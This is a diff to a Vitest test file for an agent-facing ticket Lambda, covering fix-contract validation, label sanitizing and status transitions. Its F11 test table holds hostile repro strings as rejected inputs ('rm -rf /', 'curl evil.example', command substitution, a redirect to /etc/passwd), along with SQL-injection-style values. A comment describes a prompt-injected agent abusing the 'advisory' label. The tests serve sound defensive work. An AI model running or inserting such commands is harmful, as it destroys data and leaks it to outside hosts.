@@ -22,6 +22,15 @@ const h = vi.hoisted(() => ({
     // ARTIFACT_BUCKET (the default here) the lambda never reads S3 and falls
     // back to the hardcoded roster/phase sets, matching the pre-existing tests.
     s3: /** @type {Record<string, unknown>} */ ({}),
+    // TEAM-4122 FR-5: labels_add writes (one conditional UpdateCommand per
+    // label), the rows GetCommand can see, and the labels whose conditional
+    // write should fail — the "already present OR no such ticket" branch.
+    labelUpdates: /** @type {any[]} */ ([]),
+    items: /** @type {Record<string, any>} */ ({}),
+    condFail: /** @type {string[]} */ ([]),
+    // TEAM-4130 F1: transition_ticket's status write (`SET #s = :s, …`), so the
+    // status a transition actually persists is assertable, not just its envelope.
+    statusUpdates: /** @type {any[]} */ ([]),
   },
 }));
 
@@ -50,10 +59,26 @@ vi.mock("@aws-sdk/lib-dynamodb", () => {
         send: async (cmd) => {
           const name = cmd.constructor.name;
           if (name === "UpdateCommand") {
-            // nextTicketId's counter bump.
+            const label = cmd.input.ExpressionAttributeValues?.[":label"];
+            if (label !== undefined) {
+              // A labels_add conditional append, not nextTicketId's counter bump.
+              h.state.labelUpdates.push(cmd.input);
+              if (h.state.condFail.includes(label)) {
+                const err = new Error("The conditional request failed");
+                err.name = "ConditionalCheckFailedException";
+                throw err;
+              }
+              return {};
+            }
+            if (cmd.input.ExpressionAttributeValues?.[":s"] !== undefined) {
+              // A transitionIssue status write, not nextTicketId's counter bump.
+              h.state.statusUpdates.push(cmd.input);
+              return {};
+            }
             h.state.counter += 1;
             return { Attributes: { nextNum: h.state.counter } };
           }
+          if (name === "GetCommand") return { Item: h.state.items[cmd.input.Key.ticketId] };
           if (name === "PutCommand") { h.state.puts.push(cmd.input.Item); return {}; }
           return {};
         },
@@ -72,12 +97,18 @@ beforeEach(async () => {
   h.state.puts.length = 0;
   h.state.counter = 0;
   h.state.s3 = {};
+  h.state.labelUpdates.length = 0;
+  h.state.condFail.length = 0;
+  h.state.statusUpdates.length = 0;
+  h.state.items = {};
   delete process.env.ARTIFACT_BUCKET;
   vi.resetModules();
   ({ handler } = await import("./index.mjs"));
 });
 
 const BASE = { summary: "Fix null check", assignee: "agentcore_hub_backend_dev" };
+// TEAM-4130 F1: the run's ship ticket, the one a blocker edge must not strand.
+const SHIP = "TEAM-4066";
 
 describe("create_ticket — spawnedBy/phase pass-through (D4c)", () => {
   it("persists a valid qa_fix marker + phase in the shape completion.mjs reads", async () => {
@@ -194,5 +225,496 @@ describe("create_ticket — fix-ticket phase allowlist (TEAM-3686 F2)", () => {
       expect(res.content[0].text).toContain("development, generation, scheduling");
       expect(h.state.puts.length).toBe(0);
     });
+  });
+});
+
+/**
+ * TEAM-4121 FR-8 — FIX_TICKET_CONTRACT off | shadow | enforce.
+ *
+ * The contract is what makes a fix ticket actionable by someone other than its
+ * author (invariant + evidence + citation + lineage). The rollout is staged, and
+ * each stage has a distinct, testable promise:
+ *
+ *   off      — the fix_contract argument is ignored ENTIRELY. Nothing validated,
+ *              nothing persisted, no new keys on the record or the result. A
+ *              deploy that doesn't set the flag behaves exactly as before.
+ *   shadow   — validate, ACCEPT anyway, and persist the partial contract plus a
+ *              `warnings` list naming the missing/invalid fields, so the
+ *              incomplete tickets are findable BEFORE enforce is switched on.
+ *   enforce  — refuse an incomplete contract and mint NOTHING (the id counter is
+ *              not even bumped), with an error the agent can act on.
+ *
+ * The mode is snapshotted at module load, so each describe re-imports index.mjs
+ * with its own FIX_TICKET_CONTRACT (same shape as the ARTIFACT_BUCKET describe).
+ */
+describe("create_ticket — fix contract (TEAM-4121 FR-8)", () => {
+  /** Re-import index.mjs with a given FIX_TICKET_CONTRACT value. */
+  async function load(mode) {
+    if (mode === undefined) delete process.env.FIX_TICKET_CONTRACT;
+    else process.env.FIX_TICKET_CONTRACT = mode;
+    h.state.puts.length = 0;
+    h.state.counter = 0;
+    vi.resetModules();
+    ({ handler } = await import("./index.mjs"));
+  }
+
+  afterEach(() => {
+    delete process.env.FIX_TICKET_CONTRACT;
+  });
+
+  // A qa_fix marker with a well-shaped origin id (F12) — the lineage the cap counts.
+  const FIX = { spawned_by: { kind: "qa_fix", qaTicketId: "TEAM-42" } };
+  // A contract that satisfies every rule for a qa_fix.
+  const COMPLETE = {
+    invariant: "login returns 401 for an expired token instead of 500",
+    evidence_source: "unit",
+    evidence_repro: "npm test -- auth.spec.ts",
+    cited_location: "src/auth.ts:88, src/auth.ts:120-134",
+    sibling_scope: "none",
+  };
+
+  describe("off (flag unset) — the fields are ignored entirely", () => {
+    beforeEach(async () => { await load(undefined); });
+
+    it("ignores fix_contract completely: no fixContract on the item, no warning", async () => {
+      const res = await create({ ...BASE, ...FIX, phase: "verification", fix_contract: COMPLETE });
+      expect(h.state.puts.length).toBe(1);
+      const item = h.state.puts[0];
+      expect("fixContract" in item).toBe(false);
+      expect("warning" in res).toBe(false);
+      expect("fix_contract" in res.ticket).toBe(false);
+    });
+
+    it("an INCOMPLETE contract is not even looked at — the ticket is filed silently", async () => {
+      const res = await create({ ...BASE, ...FIX, fix_contract: { invariant: "" } });
+      expect(h.state.puts.length).toBe(1);
+      expect("fixContract" in h.state.puts[0]).toBe(false);
+      expect("warning" in res).toBe(false);
+    });
+
+    it("the persisted item is byte-identical to the same ticket filed with no contract at all", async () => {
+      await create({ ...BASE, ...FIX, phase: "verification", fix_contract: COMPLETE });
+      await create({ ...BASE, ...FIX, phase: "verification" });
+      expect(h.state.puts.length).toBe(2);
+      const [withContract, without] = h.state.puts;
+      // Only the per-ticket identity/timestamps may differ.
+      const stable = (o) => ({ ...o, ticketId: "X", createdAt: "T", updatedAt: "T" });
+      expect(stable(withContract)).toEqual(stable(without));
+    });
+  });
+
+  describe("shadow — accept, but record what was missing", () => {
+    beforeEach(async () => { await load("shadow"); });
+
+    it("files an incomplete fix ticket and lists the missing fields in warnings + the result", async () => {
+      const res = await create({ ...BASE, ...FIX, phase: "verification" });
+      expect(h.state.puts.length).toBe(1);
+      const item = h.state.puts[0];
+      // qa_fix requires a citation, so all three of these are missing.
+      expect(item.fixContract).toEqual({
+        version: 1,
+        warnings: ["invariant", "evidence_source", "cited_location"],
+      });
+      expect(res.warning).toBe(
+        "WARNING: fix contract incomplete (missing: invariant, evidence_source, cited_location)"
+      );
+      // The ticket echo carries it too — the agent reads that, not the DDB item.
+      expect(res.ticket.fix_contract).toEqual(item.fixContract);
+    });
+
+    it("keeps the fields that DID parse alongside the warnings", async () => {
+      await create({ ...BASE, ...FIX, fix_contract: { invariant: "the retry budget is never negative" } });
+      expect(h.state.puts[0].fixContract).toEqual({
+        version: 1,
+        invariant: "the retry budget is never negative",
+        evidenceSource: null,
+        evidenceRepro: null,
+        citedLocation: [],
+        siblingScope: null,
+        warnings: ["evidence_source", "cited_location"],
+      });
+    });
+
+    it("a COMPLETE contract is persisted with no warnings and no advisory", async () => {
+      const res = await create({ ...BASE, ...FIX, phase: "verification", fix_contract: COMPLETE });
+      expect(h.state.puts[0].fixContract).toEqual({
+        version: 1,
+        invariant: COMPLETE.invariant,
+        evidenceSource: "unit",
+        evidenceRepro: "npm test -- auth.spec.ts",
+        citedLocation: ["src/auth.ts:88", "src/auth.ts:120-134"],
+        siblingScope: "none",
+      });
+      expect("warnings" in h.state.puts[0].fixContract).toBe(false);
+      expect("warning" in res).toBe(false);
+    });
+
+    it("a garbage FIX_TICKET_CONTRACT value coerces to SHADOW, not off", async () => {
+      // The fail-safe direction is the INVERSE of the ship/gate guards: refusing
+      // to file fix tickets because an env var was typo'd would wedge the run,
+      // so an unrecognized value validates + accepts rather than going dark.
+      await load("on");
+      const res = await create({ ...BASE, ...FIX });
+      expect(h.state.puts.length).toBe(1);
+      expect(h.state.puts[0].fixContract.warnings).toContain("invariant");
+      expect(res.warning).toMatch(/^WARNING: fix contract incomplete/);
+    });
+
+    it("a PLAIN (non-fix) ticket is never subject to the contract, even with fix_contract set", async () => {
+      const res = await create({ ...BASE, fix_contract: { invariant: "" } });
+      expect(h.state.puts.length).toBe(1);
+      expect("fixContract" in h.state.puts[0]).toBe(false);
+      expect("warning" in res).toBe(false);
+    });
+  });
+
+  describe("enforce — an incomplete contract mints nothing", () => {
+    beforeEach(async () => { await load("enforce"); });
+
+    it("rejects a missing invariant with the actionable error and writes NO ticket", async () => {
+      const res = await create({
+        ...BASE, ...FIX, phase: "verification",
+        fix_contract: { ...COMPLETE, invariant: "   " },
+      });
+      expect(res.content[0].text).toBe(
+        "Error: 'invariant' is required on a fix ticket (missing: invariant)"
+      );
+      expect(h.state.puts.length).toBe(0);
+      expect(h.state.counter).toBe(0); // the id counter isn't even bumped
+    });
+
+    it("rejects an evidence_source outside static|unit|live", async () => {
+      const res = await create({ ...BASE, ...FIX, fix_contract: { ...COMPLETE, evidence_source: "vibes" } });
+      expect(res.content[0].text).toBe(
+        "Error: 'evidence_source' is required on a fix ticket (invalid: evidence_source)"
+      );
+      expect(h.state.puts.length).toBe(0);
+    });
+
+    it("rejects a malformed origin id — a fix with no usable lineage (F12)", async () => {
+      const res = await create({
+        ...BASE,
+        spawned_by: { kind: "qa_fix", qaTicketId: 'TEAM-42" OR project = OTHER' },
+        fix_contract: COMPLETE,
+      });
+      expect(res.content[0].text).toBe(
+        "Error: 'spawned_by_origin_id' is required on a fix ticket (missing: spawned_by_origin_id)"
+      );
+      expect(h.state.puts.length).toBe(0);
+    });
+
+    it("reports missing AND invalid together, naming the first problem", async () => {
+      const res = await create({
+        ...BASE,
+        ...FIX,
+        fix_contract: { evidence_source: "nope", cited_location: "src/auth.ts:88" },
+      });
+      expect(res.content[0].text).toBe(
+        "Error: 'invariant' is required on a fix ticket (missing: invariant; invalid: evidence_source)"
+      );
+      expect(h.state.puts.length).toBe(0);
+    });
+
+    it("accepts and persists a complete contract", async () => {
+      const res = await create({ ...BASE, ...FIX, phase: "verification", fix_contract: COMPLETE });
+      expect(h.state.puts.length).toBe(1);
+      expect(h.state.puts[0].fixContract.invariant).toBe(COMPLETE.invariant);
+      expect(h.state.puts[0].fixContract.citedLocation).toEqual(["src/auth.ts:88", "src/auth.ts:120-134"]);
+      expect("warning" in res).toBe(false);
+    });
+
+    it("a ci_fix needs no citation — a build/deploy failure often has no file:line", async () => {
+      await create({
+        ...BASE,
+        spawned_by: { kind: "ci_fix", ciTicketId: "TEAM-70" },
+        phase: "development",
+        fix_contract: { invariant: "`npm test` passes on the PR head", evidence_source: "unit", evidence_repro: "npm test" },
+      });
+      expect(h.state.puts.length).toBe(1);
+      expect(h.state.puts[0].fixContract.citedLocation).toEqual([]);
+      // F11: the backticks the agent wrote are stripped from the stored text.
+      expect(h.state.puts[0].fixContract.invariant).toBe("npm test passes on the PR head");
+    });
+
+    /**
+     * F11 — evidence_repro is the ONE field that legitimately looks like a
+     * command, so it is the one field that must not be able to BE a script. Any
+     * shell composition is refused outright rather than escaped: a repro is a
+     * single command a reader can eyeball before running it.
+     */
+    it.each([
+      ["a chained command", "npm test; rm -rf /"],
+      ["an && conjunction", "npm test && curl evil.example"],
+      ["a || disjunction", "npm test || curl evil.example"],
+      ["a command substitution", "npm test $(whoami)"],
+      ["a backtick substitution", "npm test `whoami`"],
+      ["a redirect", "npm test > /etc/passwd"],
+      ["a newline", "npm test\ncurl evil.example"],
+    ])("rejects evidence_repro containing %s", async (_label, repro) => {
+      const res = await create({ ...BASE, ...FIX, fix_contract: { ...COMPLETE, evidence_repro: repro } });
+      expect(res.content[0].text).toBe(
+        "Error: 'evidence_repro' is required on a fix ticket (invalid: evidence_repro)"
+      );
+      expect(h.state.puts.length).toBe(0);
+    });
+  });
+
+  /**
+   * Provenance keys and caller labels are handled OUTSIDE the contract flag:
+   * dropping a label that squats a system namespace is a forgery guard, and the
+   * spawned_by allow-list is what keeps agents from scribbling arbitrary keys
+   * onto a ticket record. Both must hold in mode=off.
+   */
+  describe("spawned_by allow-list + label sanitizing (independent of the flag)", () => {
+    beforeEach(async () => { await load(undefined); });
+
+    it("keeps reverify/rearmOf/headSha, drops unknown keys and a bad origin id", async () => {
+      await create({
+        ...BASE,
+        spawned_by: {
+          kind: "qa_fix",
+          qaTicketId: "TEAM-42 OR 1=1", // F12: not a ticket-id shape → dropped
+          reverify: 1,                   // coerced to boolean
+          rearmOf: "TEAM-9",
+          headSha: "a1b2c3d",
+          evil: "'; DROP TABLE",         // not on the allow-list → dropped
+        },
+      });
+      expect(h.state.puts[0].spawnedBy).toEqual({
+        kind: "qa_fix",
+        reverify: true,
+        rearmOf: "TEAM-9",
+        headSha: "a1b2c3d",
+      });
+    });
+
+    it("drops caller labels squatting a system namespace and reports them back", async () => {
+      const res = await create({
+        ...BASE,
+        labels: "advisory, fix:qa_fix, WF:run1, agent:agentcore_hub_backend_dev, needs docs",
+      });
+      // "needs docs" → "needs-docs" (normalized), the system-prefixed ones refused.
+      expect(h.state.puts[0].labels).toEqual(["advisory", "needs-docs"]);
+      expect(res.droppedLabels).toEqual(["fix:qa_fix", "wf:run1", "agent:agentcore_hub_backend_dev"]);
+      expect(res.ticket.labels).toEqual(["advisory", "needs-docs"]);
+    });
+
+    it("no labels argument → no labels key and no droppedLabels (backward compatible)", async () => {
+      const res = await create({ ...BASE });
+      expect("labels" in h.state.puts[0]).toBe(false);
+      expect("droppedLabels" in res).toBe(false);
+    });
+
+    /**
+     * TEAM-4131 F2 — `advisory` is RESERVED on a fix ticket and on a human gate.
+     *
+     * Under ADVISORY_ROUTING=enforce the orchestrator treats an advisory-labelled
+     * child as backlog the run does not wait on. `labels` is a caller-supplied
+     * string that main.py exposes to every persona, so a QA agent (or a
+     * prompt-injected one) filing a REAL qa_fix with labels="advisory" made the run
+     * finalize with the fix open. completion.mjs holds the read-side floor; this is
+     * the write side — the word never reaches the record in the first place.
+     *
+     * It is deliberately NOT in SYSTEM_LABEL_PREFIXES: `advisory` is a legitimate
+     * user label on an ordinary backlog ticket (the test above pins that), so it is
+     * reserved per-ticket-SHAPE rather than globally.
+     */
+    it.each([
+      ["qa_fix", { kind: "qa_fix", qaTicketId: "TEAM-42" }],
+      ["review_fix", { kind: "review_fix", gateTicketId: "TEAM-42" }],
+      ["codex_fix", { kind: "codex_fix", codexTicketId: "TEAM-42" }],
+      ["ship_fix", { kind: "ship_fix", shipTicketId: "TEAM-42" }],
+      ["ci_fix", { kind: "ci_fix", ciTicketId: "TEAM-42" }],
+      ["sync_fix", { kind: "sync_fix", ciTicketId: "TEAM-42" }],
+    ])("a %s ticket cannot be labelled advisory — dropped and reported", async (_kind, spawned_by) => {
+      const res = await create({ ...BASE, spawned_by, labels: "Advisory, needs docs" });
+      // The ticket is still filed (dropping a label is not a rejection) …
+      expect(h.state.puts.length).toBe(1);
+      expect(h.state.puts[0].labels).toEqual(["needs-docs"]);
+      // … and the drop is REPORTED, so the Lambda logs it and the caller can see
+      // its label was refused rather than silently honoured.
+      expect(res.droppedLabels).toEqual(["advisory"]);
+      expect(res.ticket.labels).toEqual(["needs-docs"]);
+      expect(h.state.puts[0].spawnedBy.kind).toBe(spawned_by.kind);
+    });
+
+    it("a HUMAN GATE ticket cannot be labelled advisory either — being waited on is its function", async () => {
+      const res = await create({ summary: "Merge Approval", assignee: "human:reviewer", labels: "advisory" });
+      expect(res.droppedLabels).toEqual(["advisory"]);
+      expect("labels" in h.state.puts[0]).toBe(false); // the only label was dropped
+    });
+
+    it("a NON-fix, non-human ticket keeps `advisory` — the guard is narrow by design", async () => {
+      const res = await create({ ...BASE, labels: "advisory, needs docs" });
+      expect(h.state.puts[0].labels).toEqual(["advisory", "needs-docs"]);
+      expect("droppedLabels" in res).toBe(false);
+      // An unknown kind is not a fix kind. (It is also rejected as a marker, so
+      // the ticket carries no spawnedBy — the label decision must not depend on
+      // the raw argument, only on what was actually accepted.)
+      const bad = await create({ ...BASE, spawned_by: { kind: "qa_fixx" }, labels: "advisory" });
+      expect(bad.content?.[0]?.text || "").toMatch(/^Error:/);
+    });
+
+    it("the reserved word is matched exactly — 'advisory-followup' is a normal label on a fix ticket", async () => {
+      const res = await create({
+        ...BASE, spawned_by: { kind: "qa_fix", qaTicketId: "TEAM-42" }, labels: "advisory-followup, ADVISORY ",
+      });
+      expect(h.state.puts[0].labels).toEqual(["advisory-followup"]);
+      expect(res.droppedLabels).toEqual(["advisory"]); // case- and whitespace-insensitive
+    });
+
+    /**
+     * TEAM-4131 F1 — the sync-main conflict rounds ride on spawned_by, and
+     * sanitizeSpawnedBy drops any key that is not allow-listed WITHOUT a word. A
+     * dropped `round` would silently un-cap the human escalation.
+     */
+    it("keeps priorFixTicketId + round on a sync_fix, and refuses a garbage round", async () => {
+      await create({
+        ...BASE,
+        spawned_by: { kind: "sync_fix", ciTicketId: "TEAM-9", priorFixTicketId: "TEAM-500", round: "2" },
+      });
+      expect(h.state.puts[0].spawnedBy).toEqual({
+        kind: "sync_fix", ciTicketId: "TEAM-9", priorFixTicketId: "TEAM-500", round: 2,
+      });
+
+      h.state.puts.length = 0;
+      await create({
+        ...BASE,
+        spawned_by: { kind: "sync_fix", ciTicketId: "TEAM-9", priorFixTicketId: "TEAM-500 OR 1=1", round: 1e6 },
+      });
+      expect(h.state.puts[0].spawnedBy).toEqual({ kind: "sync_fix", ciTicketId: "TEAM-9" });
+    });
+  });
+});
+
+/**
+ * TEAM-4122 FR-5 — `Tickets___labels_add`, invoked with the EXACT envelope the
+ * orchestrator sends (`{ tool_name, parameters }`, both `ticket_id` and
+ * `issue_key` spelled out) when a run is CI-uncertifiable. The same op name and
+ * the same params must work on the jira Lambda — index.test.mjs there asserts
+ * the twin — because the orchestrator does not know which provider is deployed.
+ *
+ * The invariant under test is ADDITIVITY: this is the DynamoDB stand-in for
+ * Jira's `update: { labels: [{ add }] }`, so it must be a conditional
+ * `list_append` per label, never a whole-list SET (which would silently drop
+ * `human-review` / `reviewer:*` labels another writer put there).
+ */
+describe("labels_add — the op name + envelope the orchestrator sends (TEAM-4122 FR-5)", () => {
+  const invoke = (parameters) => handler({ tool_name: "Tickets___labels_add", parameters });
+
+  it("appends ci:uncertifiable additively and reports it added", async () => {
+    const res = await invoke({ ticket_id: "EPIC-1", issue_key: "EPIC-1", labels: ["ci:uncertifiable"] });
+
+    expect(res).toEqual({ key: "EPIC-1", status: "labels_added", added: ["ci:uncertifiable"], alreadyPresent: [] });
+    expect(res.error).toBeUndefined(); // NOT the unknown-tool envelope
+    expect(h.state.labelUpdates).toHaveLength(1);
+    const u = h.state.labelUpdates[0];
+    expect(u.Key).toEqual({ ticketId: "EPIC-1" });
+    expect(u.UpdateExpression).toContain("list_append");
+    expect(u.UpdateExpression).not.toMatch(/SET #l = :l\b/); // never a whole-list replace
+    expect(u.ExpressionAttributeValues[":one"]).toEqual(["ci:uncertifiable"]);
+    // attribute_exists keeps a typo'd key from CREATING a row (Update upserts).
+    expect(u.ConditionExpression).toContain("attribute_exists(ticketId)");
+    expect(u.ConditionExpression).toContain("NOT contains(#l, :label)");
+  });
+
+  it("the label is legal as sent: the system-namespace form survives verbatim", async () => {
+    const res = await invoke({ ticket_id: "EPIC-1", labels: ["ci:uncertifiable"] });
+    // `ci:` is a reserved prefix a CALLER may not use, but the system's own
+    // labels_add path must still be able to write it.
+    expect(res.added).toEqual(["ci:uncertifiable"]);
+    expect(res.dropped).toBeUndefined();
+    // No whitespace: jira rejects it outright, so the two providers must agree.
+    expect(res.added[0]).not.toMatch(/\s/);
+  });
+
+  it("ticket_id alone is accepted (issue_key is the jira spelling)", async () => {
+    const res = await invoke({ ticket_id: "EPIC-9", labels: ["ci:uncertifiable"] });
+    expect(res.key).toBe("EPIC-9");
+    expect(h.state.labelUpdates[0].Key).toEqual({ ticketId: "EPIC-9" });
+  });
+
+  it("re-labelling an already-labelled epic is idempotent, not an error", async () => {
+    h.state.items["EPIC-1"] = { ticketId: "EPIC-1", labels: ["ci:uncertifiable"] };
+    h.state.condFail.push("ci:uncertifiable");
+
+    const res = await invoke({ ticket_id: "EPIC-1", labels: ["ci:uncertifiable"] });
+
+    expect(res.status).toBe("labels_added");
+    expect(res.added).toEqual([]);
+    expect(res.alreadyPresent).toEqual(["ci:uncertifiable"]);
+  });
+
+  it("a ticket that does not exist is an ERROR, not a silent success", async () => {
+    h.state.condFail.push("ci:uncertifiable"); // no row → the same conditional failure
+    const res = await invoke({ ticket_id: "NOPE-1", labels: ["ci:uncertifiable"] });
+    expect(res.content[0].text).toBe("Error: ticket NOPE-1 not found");
+  });
+});
+
+/**
+ * TEAM-4130 F1 — the refutation this ticket turns on. `addBlockers` used to set
+ * `status = "blocked"` on every ticket it added an edge to, including a release
+ * manager that was already `in_progress`. These two tests pin what that costs by
+ * pinning the CURRENT transition table exactly as it is (TRANSITIONS is NOT
+ * changed by this ticket):
+ *
+ *   (i)  from `in_progress`, `done` resolves through the REAL `done` row — a
+ *        clean completion, which is what report_completion needs;
+ *   (ii) from `blocked` there is no `done` row at all, so the same call only
+ *        resolves because the matcher also matches on `t.to`, and the row it
+ *        lands on is `skip` — the ticket closes labelled a SKIP, and with a
+ *        `reason` it even records a skipReason. Not an error, which is exactly
+ *        why the clobber was invisible in production.
+ */
+describe("transition_ticket — reaching done from in_progress vs from blocked (TEAM-4130 F1)", () => {
+  const transition = (args) => handler({ name: "Tickets___transition_ticket", arguments: args });
+
+  it("(i) done from in_progress resolves through the real `done` transition", async () => {
+    h.state.items[SHIP] = { ticketId: SHIP, status: "in_progress", assignee: "agentcore_hub_release_manager" };
+
+    const res = await transition({ ticket_id: SHIP, to_status: "done" });
+
+    expect(res).toMatchObject({ key: SHIP, status: "transitioned", from: "in_progress", to: "done" });
+    expect(res.transition).toBe("Done"); // the real completion row, NOT "Skip"
+    expect(h.state.statusUpdates).toHaveLength(1);
+    expect(h.state.statusUpdates[0].ExpressionAttributeValues[":s"]).toBe("done");
+    expect(h.state.statusUpdates[0].UpdateExpression).not.toContain("skipReason");
+  });
+
+  it("(ii) done from blocked resolves through the `skip` row's `to` alias", async () => {
+    h.state.items[SHIP] = { ticketId: SHIP, status: "blocked", assignee: "agentcore_hub_release_manager" };
+
+    const res = await transition({ ticket_id: SHIP, to_status: "done" });
+
+    // It SUCCEEDS — and that is the problem: the run's ship ticket is recorded
+    // as Skipped, not Completed.
+    expect(res).toMatchObject({ key: SHIP, status: "transitioned", from: "blocked", to: "done" });
+    expect(res.transition).toBe("Skip");
+    expect(h.state.statusUpdates[0].ExpressionAttributeValues[":s"]).toBe("done");
+  });
+
+  it("(ii, cont.) …and with a reason it stamps skipReason on a completed ticket", async () => {
+    h.state.items[SHIP] = { ticketId: SHIP, status: "blocked", assignee: "agentcore_hub_release_manager" };
+
+    const res = await transition({ ticket_id: SHIP, to_status: "done", reason: "PR merged, deploy triggered" });
+
+    expect(res.skipReason).toBe("PR merged, deploy triggered");
+    expect(h.state.statusUpdates[0].UpdateExpression).toContain("#sr = :sr");
+    expect(h.state.statusUpdates[0].ExpressionAttributeNames["#sr"]).toBe("skipReason");
+  });
+
+  it("blocked offers no `done` transition id — only `skip` reaches done", async () => {
+    h.state.items[SHIP] = { ticketId: SHIP, status: "blocked", assignee: "agentcore_hub_release_manager" };
+
+    const res = await handler({ name: "Tickets___get_transitions", arguments: { ticket_id: SHIP } });
+
+    expect(res.currentStatus).toBe("blocked");
+    expect(res.transitions.map((t) => t.id)).not.toContain("done");
+    expect(res.transitions.filter((t) => t.to === "done").map((t) => t.id)).toEqual(["skip"]);
+    // in_progress, by contrast, has the real one.
+    h.state.items[SHIP].status = "in_progress";
+    const live = await handler({ name: "Tickets___get_transitions", arguments: { ticket_id: SHIP } });
+    expect(live.transitions.map((t) => t.id)).toContain("done");
   });
 });
